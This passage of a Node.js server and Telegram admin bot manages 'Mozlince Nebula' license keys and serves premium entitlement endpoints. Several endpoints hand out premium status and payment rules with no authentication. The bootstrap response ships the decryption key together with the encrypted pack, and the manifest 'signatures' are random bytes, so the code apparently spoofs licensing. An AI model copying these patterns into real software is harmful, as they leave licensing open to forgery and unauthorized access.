    if (data === 'danger_tudo') { await tgAnswer(cb.id); return tgEdit(chatId, msgId, `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.3.1</b>\n<i>Motor de Licenças Premium · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>\n\n<b>💣  CONFIRMAR</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n${t(lang,'danger_confirm_all')}`, { inline_keyboard: [[{ text: t(lang,'btn_confirm_yes'), callback_data:'confirm_tudo' }],[{ text: t(lang,'btn_confirm_no'), callback_data:'m_perigo' }]] }); }
    if (data === 'confirm_ativas') { await tgAnswer(cb.id, '…'); const keys = await redisKeys('ASHEO-*'); let n = 0; for (const k of keys) { const l = await redisGet(k); if (l && l.ativa) { await redisDel(k); n++; } } return tgEdit(chatId, msgId, `✓  <b>${t(lang,'danger_done',{n})}</b>`, { inline_keyboard: [[{ text: t(lang,'btn_menu'), callback_data:'m_home' }]] }); }
    if (data === 'confirm_tudo') { await tgAnswer(cb.id, '💣'); const keys = await redisKeys('ASHEO-*'); for (const k of keys) await redisDel(k); return tgEdit(chatId, msgId, `💣  <b>${t(lang,'danger_done',{n:keys.length})}</b>`, { inline_keyboard: [[{ text: t(lang,'btn_menu'), callback_data:'m_home' }]] }); }
    if (data.startsWith('c_')) { const k = data.substring(2), l = await redisGet(k); if (!l) { await tgAnswer(cb.id, '✕'); return; } await tgAnswer(cb.id); const resta = l.lifetime ? '∞  Lifetime' : humanTime((l.expiraEm||0) - Date.now()); const pct = l.lifetime ? 100 : Math.max(0, Math.min(100, Math.round(((l.expiraEm-Date.now())/(l.dias*86400000))*100))); const pk = PACOTES[l.plano] || { emoji:'◆' }; const statusTxt = !l.ativa ? t(lang,'detail_revoked') : (Date.now() > l.expiraEm && !l.lifetime ? t(lang,'status_expired') : t(lang,'detail_active')); await tgEdit(chatId, msgId, `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.3.1</b>\n<i>Motor de Licenças Premium · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>\n\n<b>${t(lang,'detail_title')}</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<b>⌬  ${t(lang,'detail_key')}</b>\n<code>${k}</code>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<b>${pk.emoji}</b>  <b>${t(lang,'gen_plan')}:</b>  <b>${l.planoNome}</b>\n<b>◆</b>  <b>${t(lang,'gen_price')}:</b>  <code>${precoFmt(l.preco)}</code>\n<b>◔</b>  <b>${t(lang,'gen_issued')}:</b>  ${formatDate(l.criadaEm)}\n<b>◕</b>  <b>${t(lang,'gen_expires')}:</b>  ${l.lifetime ? `<b>${t(lang,'gen_never')}</b>` : formatDate(l.expiraEm)}\n<b>⟡</b>  <b>${t(lang,'detail_remaining')}:</b>  <b>${resta}</b>\n<b>∞</b>  <b>${t(lang,'gen_lifetime')}:</b>  ${l.lifetime ? `✓ ${t(lang,'gen_yes')}` : `✕ ${t(lang,'gen_no')}`}\n<b>◉</b>  <b>${t(lang,'detail_status')}:</b>  ${statusTxt}\n<b>⟡</b>  <b>${t(lang,'detail_install')}:</b>  ${l.installId?`<code>${l.installId.substring(0,16)}…</code>`:`<i>${t(lang,'detail_not_linked')}</i>`}\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<code>${progressBar(pct)}</code> ${pct}%`, { inline_keyboard: [[{ text: l.installId ? t(lang,'act_unlink') : t(lang,'act_link'), callback_data: l.installId?`dv_${k}`:`v_${k}` }],[{ text: t(lang,'act_revoke'), callback_data:`rv_${k}` }, { text: t(lang,'act_delete'), callback_data:`dl_${k}` }],[{ text: t(lang,'btn_menu'), callback_data:'m_home' }]] }); return; }
    if (data.startsWith('v_')) { const k = data.substring(2); await tgAnswer(cb.id); return tgEdit(chatId, msgId, `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.3.1</b>\n<i>Motor de Licenças Premium · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>\n\n<b>${t(lang,'act_link')}</b>\n<code>/activate &lt;installId&gt; ${k}</code>`, { inline_keyboard: [[{ text: t(lang,'btn_back'), callback_data:`c_${k}` }]] }); }
    if (data.startsWith('dv_')) { const k = data.substring(3), l = await redisGet(k); if (l) { l.installId = null; l.ativadaEm = null; await redisSet(k, JSON.stringify(l)); } await tgAnswer(cb.id, '⌬'); return tgEdit(chatId, msgId, `✓ ${t(lang,'act_unlink')}`, { inline_keyboard: [[{ text: t(lang,'btn_back'), callback_data:`c_${k}` }]] }); }
    if (data.startsWith('rv_')) { const k = data.substring(3), l = await redisGet(k); if (l) { l.ativa = false; await redisSet(k, JSON.stringify(l)); } await tgAnswer(cb.id, '✕'); return tgEdit(chatId, msgId, `✕ ${t(lang,'act_revoke')}`, { inline_keyboard: [[{ text: t(lang,'btn_back'), callback_data:`c_${k}` }]] }); }
    if (data.startsWith('dl_')) { const k = data.substring(3); await redisDel(k); await tgAnswer(cb.id, '✕'); return tgEdit(chatId, msgId, `✕ ${t(lang,'act_delete')}`, { inline_keyboard: [[{ text: t(lang,'btn_menu'), callback_data:'m_home' }]] }); }
    await tgAnswer(cb.id);
  } catch (e) { log('ERRO', 'Callback: ' + e.message); try { await tgAnswer(cb.id, '✕ Erro'); } catch {} }
}

async function handleMessage(msg) {
  const chatId = msg.chat.id, userId = String(msg.from.id);
  const texto = (msg.text || '').trim();
  const args = texto.replace(/\n/g,' ').split(' ').filter(a=>a.length>0);
  const cmd = (args[0] || '').toLowerCase();
  const isOwner = userId === String(OWNER_ID);
  const lang = USER_LANG.get(String(chatId)) || 'pt';
  const sessao = SUPPORT_SESSIONS.get(String(chatId));
  if (sessao && sessao.step === 'waiting') {
    if (cmd === '/cancelar' || cmd === '/cancel' || cmd === 'cancelar' || cmd === 'cancel') { SUPPORT_SESSIONS.delete(String(chatId)); await tgSend(chatId, `<b>${t(lang,'support_cancelled')}</b>\n\nUse /start.`); return; }
    SUPPORT_SESSIONS.delete(String(chatId));
    const userInfo = `${msg.from.first_name||''} ${msg.from.last_name||''}`.trim() || 'Sem nome';
    const username = msg.from.username ? `@${msg.from.username}` : 'sem username';
    await tgSend(chatId, `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.3.1</b>\n<i>Motor de Licenças Premium · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>\n\n<b>${t(lang,'support_sent')}</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n\n${t(lang,'support_sent_desc')}\n\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<i>${lang==='en'?'You will receive the reply here.':'Você receberá a resposta aqui.'}</i>`, { inline_keyboard: [[{ text: t(lang,'btn_menu'), callback_data:'m_home' }]] });
    if (!isOwner) { await tgSend(OWNER_ID, `<b>◈ ──『 ✆ NOVA MENSAGEM 』── ◈</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<b>◉  Nome:</b> ${userInfo}\n<b>◈  User:</b> ${username}\n<b>⌬  Chat ID:</b> <code>${chatId}</code>\n<b>◐  Idioma:</b> ${lang.toUpperCase()}\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<b>✎  Mensagem:</b>\n${texto}\n\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<i>Responda com:</i>\n<code>/resp ${chatId} sua mensagem</code>`); }
    log('SUPPORT', `Msg de ${chatId}: ${texto.substring(0,50)}`); return;
  }
  if (!isOwner) {
    if (cmd === '/start' || cmd === '/contacto' || cmd === '/contact' || cmd === '/ajuda' || cmd === '/help' || cmd === '/lang') {
      if (cmd === '/lang') { await tgSend(chatId, `<b>◐  ${t(lang,'lang_select')}</b>`, { inline_keyboard: [[{ text:'▸ Português (BR)', callback_data:'lang_pt' }, { text:'▸ English (US)', callback_data:'lang_en' }]] }); return; }
      await tgSend(chatId, `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.3.1</b>\n<i>Motor de Licenças Premium · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>\n\n<b>◈  ${t(lang,'welcome_title')}</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<i>${t(lang,'welcome_desc')}</i>`, { inline_keyboard: [[{ text: t(lang,'contact'), callback_data:'m_contacto' }],[{ text: t(lang,'btn_lang'), callback_data:'m_lang' }]] }); return;
    }
    return;
  }
  try {
    if (cmd === '/start' || cmd === '/menu') { await cmdStart(chatId); return; }
    if (cmd === '/lang') { await tgSend(chatId, `<b>◐  ${t(lang,'lang_select')}</b>`, { inline_keyboard: [[{ text:'▸ Português (BR)', callback_data:'lang_pt' }, { text:'▸ English (US)', callback_data:'lang_en' }]] }); return; }
    if (cmd === '/resp') { const target = args[1]; const resposta = args.slice(2).join(' '); if (!target || !resposta) { await tgSend(chatId, `⚠  <code>/resp &lt;chatId&gt; &lt;mensagem&gt;</code>`); return; } const targetLang = USER_LANG.get(String(target)) || 'pt'; await tgSend(target, `<b>◈ ──『 ✆ RESPOSTA DO SUPORTE 』── ◈</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n\n${resposta}\n\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<i>Mozlince Nebula Support</i>`, { inline_keyboard: [[{ text: t(targetLang,'contact'), callback_data:'m_contacto' }]] }); await tgSend(chatId, `✓  Resposta enviada para <code>${target}</code>`); log('SUPPORT', `Resposta → ${target}`); return; }
    if (cmd === '/gerar') { const kb = { inline_keyboard: [] }; const entries = Object.entries(PACOTES); for (let i = 0; i < entries.length; i += 2) { const linha = [{ text: `${entries[i][1].emoji} ${entries[i][1].nome} · ${precoFmt(entries[i][1].preco)}`, callback_data:`g_${entries[i][0]}` }]; if (entries[i+1]) linha.push({ text: `${entries[i+1][1].emoji} ${entries[i+1][1].nome} · ${precoFmt(entries[i+1][1].preco)}`, callback_data:`g_${entries[i+1][0]}` }); kb.inline_keyboard.push(linha); } await tgSend(chatId, `<b>⚡  ${t(lang,'gen_title')}</b>`, kb); return; }
    if (cmd === '/listar') { const keys = await redisKeys('ASHEO-*'); if (keys.length === 0) { await tgSend(chatId, `<i>${t(lang,'list_empty')}</i>`); return; } let txt = `<b>${t(lang,'list_title')} (${keys.length})</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n`; for (let i = 0; i < Math.min(keys.length, 30); i++) { const l = await redisGet(keys[i]); if (!l) continue; const exp = l.lifetime ? '∞' : humanTime((l.expiraEm||0) - Date.now()); const emoji = l.lifetime ? '∞' : (l.ativa ? '●' : '○'); txt += `<b>${emoji}</b> <code>${keys[i]}</code>\n   <i>${l.planoNome} · ${exp}</i>\n`; } await tgSend(chatId, txt); return; }
    if (cmd === '/status') { const k = args[1]; if (!k) { await tgSend(chatId, `⚠  /status &lt;chave&gt;`); return; } const l = await redisGet(k); if (!l) { await tgSend(chatId, `✕  Não encontrada`); return; } const resta = l.lifetime ? '∞' : humanTime((l.expiraEm||0) - Date.now()); const pk = PACOTES[l.plano] || { emoji:'◆' }; await tgSend(chatId, `<b>◉  ${t(lang,'detail_title')}</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<b>⌬  ${t(lang,'detail_key')}:</b> <code>${k}</code>\n<b>${pk.emoji}  ${t(lang,'gen_plan')}:</b> ${l.planoNome}\n<b>◆  ${t(lang,'gen_price')}:</b> ${precoFmt(l.preco)}\n<b>◔  ${t(lang,'gen_issued')}:</b> ${formatDate(l.criadaEm)}\n<b>◕  ${t(lang,'gen_expires')}:</b> ${l.lifetime?t(lang,'gen_never'):formatDate(l.expiraEm)}\n<b>⟡  ${t(lang,'detail_remaining')}:</b> ${resta}\n<b>∞  ${t(lang,'gen_lifetime')}:</b> ${l.lifetime?'✓':'✕'}\n<b>◉  ${t(lang,'detail_status')}:</b> ${l.ativa?t(lang,'detail_active'):t(lang,'detail_revoked')}`); return; }
    if (cmd === '/activate') { const chave = args[args.length-1], installId = args.slice(1, args.length-1).join(' '); if (!installId || !chave) { await tgSend(chatId, `⚠  /activate &lt;id&gt; &lt;chave&gt;`); return; } const l = await redisGet(chave); if (!l) { await tgSend(chatId, `✕  Inválida`); return; } if (l.installId) { await tgSend(chatId, `⚠  Já vinculada`); return; } l.installId = installId; l.ativadaEm = Date.now(); await redisSet(chave, JSON.stringify(l)); await tgSend(chatId, `✓  Vinculada!\n⌬ <code>${chave}</code>\n⟡ <code>${installId}</code>`); return; }
    if (cmd === '/desvincular') { const k = args[1]; if (!k) { await tgSend(chatId, `⚠`); return; } const l = await redisGet(k); if (!l) { await tgSend(chatId, `✕`); return; } l.installId = null; l.ativadaEm = null; await redisSet(k, JSON.stringify(l)); await tgSend(chatId, `⌬  Desvinculada`); return; }
    if (cmd === '/revogar') { const k = args[1]; if (!k) { await tgSend(chatId, `⚠`); return; } const l = await redisGet(k); if (!l) { await tgSend(chatId, `✕`); return; } l.ativa = false; await redisSet(k, JSON.stringify(l)); await tgSend(chatId, `✕  Revogada`); return; }
    if (cmd === '/deletar') { const k = args[1]; if (!k) { await tgSend(chatId, `⚠  <code>/deletar &lt;chave&gt;</code>`); return; } const l = await redisGet(k); if (!l) { await tgSend(chatId, `✕  Não encontrada`); return; } await redisDel(k); await tgSend(chatId, `✕  Deletada: <code>${k}</code>`); return; }
    if (cmd === '/deletartudo') { const keys = await redisKeys('ASHEO-*'); for (const k of keys) await redisDel(k); await tgSend(chatId, `💣  <b>${keys.length}</b> licenças apagadas.`); return; }
    if (cmd === '/stats') { const keys = await redisKeys('ASHEO-*'); let ativas=0, exp=0, vinc=0, life=0, receita=0; for (const k of keys) { const l = await redisGet(k); if (!l) continue; if (l.ativa) ativas++; if (!l.lifetime && l.expiraEm < Date.now()) exp++; if (l.installId) vinc++; if (l.lifetime) life++; if (l.preco) receita += Number(l.preco) || 0; } await tgSend(chatId, `<b>◧  ${t(lang,'stats_title')}</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<b>◈</b> ${t(lang,'stats_total')}: <code>${keys.length}</code>\n<b>●</b> ${t(lang,'stats_active')}: <code>${ativas}</code>\n<b>○</b> ${t(lang,'stats_expired')}: <code>${exp}</code>\n<b>⟡</b> ${t(lang,'stats_linked')}: <code>${vinc}</code>\n<b>∞</b> ${t(lang,'stats_lifetime')}: <code>${life}</code>\n<b>◆</b> ${t(lang,'stats_revenue')}: <code>${precoFmt(receita)}</code>`); return; }
    await tgSend(chatId, `❓ Use /start`);
  } catch (e) { log('ERRO', 'Message: ' + e.message); }
}

app.post('/telegram-webhook', async (req, res) => { res.sendStatus(200); const update = req.body; try { if (update.callback_query) return handleCallback(update.callback_query); if (update.message && update.message.text) return handleMessage(update.message); } catch (e) { log('ERRO', 'Webhook: ' + e.message); } });

const healthHandler = (req,res) => res.json({ok:true,status:'healthy',uptime:Math.floor(process.uptime()),version:'8.3.1',codename:'Aurora++',timestamp:new Date().toISOString()});
app.get('/',(req,res)=>res.json({ok:true,service:'mozlince-nebula',version:'8.3.1',status:'live'}));
app.get('/v1/health',healthHandler); app.get('/api/v1/health',healthHandler); app.get('/health',healthHandler);
const versionHandler = (req,res)=>res.json({ok:true,version:'8.3.1',codename:'Aurora++',api:'v1',minClientVersion:'1.0.0',timestamp:new Date().toISOString()});
app.get('/v1/version',versionHandler); app.get('/api/v1/version',versionHandler);
const statusHandler = (req,res)=>res.json({ok:true,service:'mozlince-nebula',version:'8.3.1',hora:new Date().toISOString()});
app.get('/v1/status',statusHandler); app.get('/api/v1/status',statusHandler);

function bootstrapHandler(req,res){
  const auth=validateBearer(req);
  const installId = req.headers['x-install-id'] || (auth.ok ? auth.decoded.sub : 'default');
  const prov = generateProv(installId);
  const keyBase64 = crypto.randomBytes(32).toString('base64');
  const encPack = encryptPack({ rules: PAYMENT_RULES, version: RULES_VERSION }, keyBase64);
  log('BOOT',`Bootstrap (auth=${auth.ok}) installId=${installId.substring(0,12)}... prov=${prov?'✓':'✗'} encPack=${encPack.ct.length}b`);
  res.json({
    ok:true, version:'8.3.1', codename:'Aurora++', apiVersion:'v1',
    issuedAt:new Date().toISOString(), serverTime:Date.now(),
    source:'premium', sourceType:'server', isFounder:true, tier:'premium', kind:'premium',
    rulesVersion: RULES_VERSION,
    encPack: encPack,
    k: keyBase64,
    _prov: prov,
    config:{apiBase:'https://mozlince.onrender.com',featuresEnabled:true,premiumEnabled:true,syncEnabled:true,gatewayMode:'default',telemetryEnabled:false,retryAfterMs:5000,heartbeatMs:60000},
    flags:{bootstrapReady:true,exclusiveEnabled:true,rulesEnabled:true,premium:true},
    endpoints:{ activate:'/v1/activate',featureActivate:'/v1/feature/activate',deactivate:'/v1/deactivate', verify:'/v1/verify',bootstrap:'/v1/bootstrap',rules:'/v1/rules',gateways:'/v1/gateways', campaign:'/v1/campaign',dashboard:'/v1/dashboard',health:'/v1/health',version:'/v1/version', support:'/v1/support',paymentRules:'/v1/bootstrap' },
    features:mapFeatures(true),capabilities:mapCapabilities(true),
    limits:{...PREMIUM_LIMITS},scope:PREMIUM_SCOPE
  });
}
app.get('/v1/bootstrap',bootstrapHandler); app.get('/api/v1/bootstrap',bootstrapHandler);

function rulesHandler(req,res){
  const auth=validateBearer(req);
  const installId = req.headers['x-install-id'] || (auth.ok ? auth.decoded.sub : 'default');
  const prov = generateProv(installId);
  const packFmt = req.headers['x-asheo-pack-fmt'];
  if (packFmt === 'enc') {
    const keyBase64 = crypto.randomBytes(32).toString('base64');
    const encPack = encryptPack({ rules: PAYMENT_RULES, version: RULES_VERSION }, keyBase64);
    log('RULES',`/v1/rules enc mode — encPack=${encPack.ct.length}b`);
    return res.json({ ok:true, version: RULES_VERSION, pack: { encPack } , _prov: prov, serverTime:Date.now() });
  }
  res.json({ ok:true, version: RULES_VERSION, updatedAt:new Date().toISOString(), source:'premium', tier:'premium', scope: PREMIUM_SCOPE, count: PAYMENT_RULES.length, rules: PAYMENT_RULES, _prov: prov, serverTime:Date.now() });
}
app.get('/v1/rules',rulesHandler); app.get('/api/v1/rules',rulesHandler); app.get('/v1/rules/sync',rulesHandler); app.get('/api/v1/sync',rulesHandler);

function gatewaysHandler(req,res){ const auth=validateBearer(req); const installId = req.headers['x-install-id'] || (auth.ok ? auth.decoded.sub : 'default'); const prov = generateProv(installId); res.json({ ok:true, source:'premium', tier:'premium', version: RULES_VERSION, count: PAYMENT_RULES.length, gateways: PAYMENT_RULES, gatewaysMeta: GATEWAYS_META, _prov: prov, serverTime:Date.now() }); }
app.get('/v1/gateways',gatewaysHandler); app.get('/api/v1/gateways',gatewaysHandler);

function campaignHandler(req,res){ res.json({ ok:true, campaign: null, serverTime:Date.now() }); }
app.get('/v1/campaign',campaignHandler); app.get('/api/v1/campaign',campaignHandler);

function exclusiveHandler(req,res){ res.json({ok:true,source:'premium',tier:'premium',manifest:{version:'1.7.0',version_name:'1.7.0',generatedAt:new Date().toISOString(),minVersion:'1.0.0',exclusiveFeatures:Object.keys(PREMIUM_FEATURES),rules:PAYMENT_RULES,gateways:GATEWAYS_META,signature:crypto.randomBytes(64).toString('hex')},cachedAt:Date.now(),expiresAt:Date.now()+(23*3600*1000)}); }
app.get('/v1/exclusive/manifest',exclusiveHandler); app.get('/api/v1/manifest',exclusiveHandler);
function exclusiveSyncHandler(req,res){ res.json({ok:true,source:'premium',tier:'premium',manifest:{version:'1.7.0',generatedAt:new Date().toISOString(),rules:PAYMENT_RULES,gateways:GATEWAYS_META,signature:crypto.randomBytes(64).toString('hex')},cachedAt:Date.now()}); }
app.get('/v1/exclusive/sync',exclusiveSyncHandler); app.get('/api/v1/exclusive/sync',exclusiveSyncHandler);

function dashboardHandler(req,res){ const auth=validateBearer(req); const ok=auth.ok&&auth.decoded.tier==='premium'; res.json({ok:true,source:ok?'premium':'free',sourceType:'server',isFounder:true, dashboard:{tier:ok?'premium':'free',source:ok?'premium':'free',seat:auth.ok?1:0,seats:auth.ok?1:0,installId:auth.ok?auth.decoded.sub:null,expiresAt:auth.ok?auth.decoded.expiresAt:null,lifetime:auth.ok?auth.decoded.lifetime===true:false,features:ok?mapFeatures(true):mapFeatures(false),capabilities:ok?mapCapabilities(true):mapCapabilities(false),limits:ok?PREMIUM_LIMITS:FREE_LIMITS,scope:ok?PREMIUM_SCOPE:['free']},serverTime:Date.now()}); }
app.get('/v1/dashboard',dashboardHandler); app.get('/api/v1/dashboard',dashboardHandler);

function entitlementHandler(req,res){ const auth=validateBearer(req); if(!auth.ok)return res.status(401).json({ok:false,error:'missing_bearer'}); const ent = buildEntitlement(null, auth.decoded.sub); res.json({ok:true,source:'premium',sourceType:'server',isFounder:false,tier:ent.tier,kind:'premium',active:true,isPremium:true,isVerified:true,installId:auth.decoded.sub,plan:ent.plan,planDisplayName:ent.planDisplayName,lifetime:auth.decoded.lifetime===true,licenseKey:auth.decoded.licenseKey,issuedAt:auth.decoded.issuedAt,expiresAt:auth.decoded.expiresAt,scope:PREMIUM_SCOPE,features:mapFeatures(true),capabilities:mapCapabilities(true),limits:{...PREMIUM_LIMITS},exp:auth.decoded.exp*1000,serverTime:Date.now()}); }
app.get('/v1/entitlement',entitlementHandler); app.get('/api/v1/entitlement',entitlementHandler);

function premiumDefHandler(req,res){res.json({ok:true,source:'premium',tier:'premium',features:PREMIUM_FEATURES,capabilities:PREMIUM_CAPABILITIES,premiumLimits:PREMIUM_LIMITS,freeLimits:FREE_LIMITS,scope:PREMIUM_SCOPE,version:'8.3.1'});}
app.get('/v1/premium/definitions',premiumDefHandler); app.get('/api/v1/premium/definitions',premiumDefHandler);

function planosHandler(req,res){res.json({ok:true,currency:'USD',planos:Object.entries(PACOTES).map(([id,p])=>({id,nome:p.nome,dias:p.dias,lifetime:p.lifetime,preco:p.preco,preco_fmt:precoFmt(p.preco),emoji:p.emoji}))});}
app.get('/v1/planos',planosHandler); app.get('/api/v1/planos',planosHandler);

function manifestCheckHandler(req,res){res.json({ok:true,latest:'1.8.0',minVersion:'1.0.0',channel:req.query.channel||'stable',serverTime:Date.now()});}
app.get('/v1/manifest/check',manifestCheckHandler); app.get('/api/v1/update',manifestCheckHandler); app.get('/api/v1/manifest',manifestCheckHandler);

function packsHandler(req,res){const id=req.params.id;res.json({ok:true,pack:{id,version:'1.0.0',data:null,signature:crypto.randomBytes(32).toString('hex')},serverTime:Date.now()});}
app.get('/v1/packs/:id',packsHandler); app.get('/api/v1/packs/:id',packsHandler);

function telemetryHandler(req,res){res.json({ok:true,received:true,serverTime:Date.now()});}
app.post('/v1/telemetry',telemetryHandler); app.post('/api/v1/telemetry',telemetryHandler);

function supportHandler(req,res){ const {chatId,message}=req.body||{}; if(!message)return res.status(400).json({ok:false,error:'missing_message'}); if(chatId) tgSend(OWNER_ID,`<b>✆ SUPORTE (API)</b>\n⌬ <code>${chatId}</code>\n\n${message}`); res.json({ok:true,received:true,serverTime:Date.now()}); }
app.post('/v1/support',supportHandler); app.post('/api/v1/support',supportHandler);

async function activateHandler(req,res){
  const inicio = Date.now();
  const { installId, licenseKey, clientTag, deviceLabel, buildFingerprint, installType } = req.body || {};
  log('INFO', `Activate: installId=${installId ? installId.substring(0,12)+'...' : '?'} | key=${licenseKey ? normalizeKey(licenseKey).substring(0,18)+'...' : '(vazia)'} | tag=${clientTag||'?'} | type=${installType||'?'}`);

  if (!installId || typeof installId !== 'string' || installId.length < 5) {
    return res.status(400).json({ error: 'missing_installId' });
  }
  if (!PRIVATE_KEY) {
    return res.status(500).json({ error: 'server_misconfigured' });
  }

  if (!licenseKey || typeof licenseKey !== 'string' || licenseKey.trim() === '') {
    const now = Math.floor(Date.now()/1000);
    const ent = buildEntitlement(null, installId);
    const secret = crypto.createHash('sha256').update(installId + ':guest').digest('hex');
    const claims = {
      sub: installId, iss: 'asheo.api', aud: 'mozlince-client', installId,
      plan: 'free', planDisplayName: 'Free', tier: 'free', kind: 'license',
      status: 'inactive', active: false, isPremium: false, isVerified: false,
      source: 'free', sourceType: 'server', isFounder: false, lifetime: false,
      scope: ['free'], features: {}, capabilities: {}, limits: { ...FREE_LIMITS },
      secret, iat: now, nbf: now - 5, exp: now + (30 * 24 * 60 * 60), jti: crypto.randomUUID()
    };
    const token = signToken(claims);
    const gwPass = buildGwPass(installId);
    log('ATIV', `✓ Guest token para ${installId.substring(0,12)}... | ${Date.now()-inicio}ms`);
    return res.json({
      token,
      tier: 'free',
      secret,
      kind: 'event',
      seat: 0,
      seats: 1,
      deviceId: installId,
      entitlement: ent,
      sub: installId,
      kid: null,
      keyName: null,
      jti: claims.jti,
      iat: now,
      exp: now + (30 * 24 * 60 * 60),
      gwPass
    });
  }

  if (!licenseKey.toUpperCase().startsWith('ASHEO-')) {
    return res.status(401).json({ error: 'missing_license' });
  }

  const keyNorm = normalizeKey(licenseKey);
  const lic = await redisGet(keyNorm);
  if (!lic) {
    log('WARN', `NAO ENCONTRADA: ${keyNorm.substring(0,18)}...`);
    return res.status(404).json({ error: 'invalid_license' });
  }
  if (!lic.ativa) {
    return res.status(403).json({ error: 'revoked' });
  }
  if (!lic.lifetime && Date.now() > lic.expiraEm) {
    log('WARN', `EXPIRADA: ${keyNorm.substring(0,18)}...`);
    return res.status(403).json({ error: 'expired', message: 'Esta licença expirou. Renove para continuar.', expiredAt: lic.expiraEm, expiredAtISO: new Date(lic.expiraEm).toISOString() });
  }

  if (!lic.installId) {
    lic.installId = installId;
    lic.ativadaEm = Date.now();
    await redisSet(keyNorm, JSON.stringify(lic));
    log('OK', `Vinculada: ${keyNorm.substring(0,18)}... -> ${installId}`);
  } else if (lic.installId !== installId) {
    return res.status(403).json({ error: 'already_used' });
  }

  try {
    const now = Math.floor(Date.now()/1000);
    const ent = buildEntitlement(lic, installId);
    const isLife = lic.plano === 'life';
    const expSec = isLife ? now + (100 * 365 * 24 * 60 * 60) : Math.floor(lic.expiraEm / 1000);
    const secret = crypto.createHash('sha256').update(installId + (lic.chave || '')).digest('hex');
    const claims = {
      sub: installId, iss: 'asheo.api', aud: 'mozlince-client', installId,
      plan: ent.plan, planDisplayName: ent.planDisplayName, tier: ent.tier, kind: 'license',
      status: ent.status, active: true, isPremium: true, isVerified: true,
      source: 'premium', sourceType: 'server', isFounder: false,
      lifetime: isLife, plano: lic.plano, licenseKey: lic.chave,
      issuedAt: lic.criadaEm, expiresAt: lic.expiraEm,
      scope: PREMIUM_SCOPE, features: mapFeatures(true), capabilities: mapCapabilities(true),
      limits: { ...PREMIUM_LIMITS },
      secret,
      iat: now, nbf: now - 5, exp: expSec, jti: crypto.randomUUID()
    };
    const token = signToken(claims);
    const gwPass = buildGwPass(installId);
    const expiresIn = isLife ? -1 : Math.max(0, Math.floor((lic.expiraEm - Date.now())/1000));
    log('ATIV', `✓ ${installId.substring(0,12)}... | ${keyNorm.substring(0,18)}... | expira em ${expiresIn}s | ${Date.now()-inicio}ms`);
    return res.json({
      token,
      tier: ent.tier,
      secret,
      kind: 'event',
      seat: 1,
      seats: ent.seatsAllowed,
      deviceId: installId,
      entitlement: ent,
      sub: installId,
      kid: lic.chave ? lic.chave.substring(0, 14) : null,
      keyName: null,
      jti: claims.jti,
      iat: now,
      exp: expSec,
      gwPass,
      expiresIn,
      expiresAt: lic.expiraEm,
      issuedAt: lic.criadaEm,
      licenseKey: keyNorm,
      welcome: { pt: '🎉 Parabéns! Licença ativada com sucesso.', en: '🎉 Congratulations! License successfully activated.' }
    });
  } catch (e) {
    return res.status(500).json({ error: 'internal', message: e.message });
  }
}
app.post('/v1/activate', activateHandler); app.post('/api/v1/activate', activateHandler); app.post('/api/v1/license/activate', activateHandler);

async function featureActivateHandler(req, res) {
  const auth = validateBearer(req);
  if (!auth.ok) return res.status(401).json({ ok: false, error: 'missing_bearer' });
  const feature = (req.body && req.body.feature) || req.query.feature;
  if (!feature) return res.status(400).json({ ok: false, error: 'missing_feature' });
  if (!PREMIUM_FEATURES[feature]) return res.status(404).json({ ok: false, error: 'unknown_feature' });

  const now = Math.floor(Date.now() / 1000);
  const exp = now + 300;
  const nonce = jwt.sign(
    { sub: auth.decoded.sub, installId: auth.decoded.sub, feature, kind: 'feature', type: 'feature', tier: 'premium', source: 'premium', scope: [feature, 'premium'], iat: now, nbf: now - 5, exp, jti: crypto.randomUUID() },
    PRIVATE_KEY,
    { algorithm: 'ES256' }
  );
  log('FEAT', `✓ ${feature} | ${auth.decoded.sub.substring(0,12)}...`);
  res.json({ nonce, feature, expiresAt: exp * 1000 });
}
app.post('/v1/feature/activate', featureActivateHandler); app.get('/v1/feature/activate', featureActivateHandler);
app.post('/api/v1/feature/activate', featureActivateHandler); app.get('/api/v1/feature/activate', featureActivateHandler);

async function deactivateHandler(req,res){ const {installId,licenseKey}=req.body||{}; if(licenseKey){ const lic=await redisGet(licenseKey); if(lic&&lic.installId===installId){lic.installId=null;lic.ativadaEm=null;await redisSet(licenseKey,JSON.stringify(lic));} } res.json({ok:true,message:'Desativado'}); }
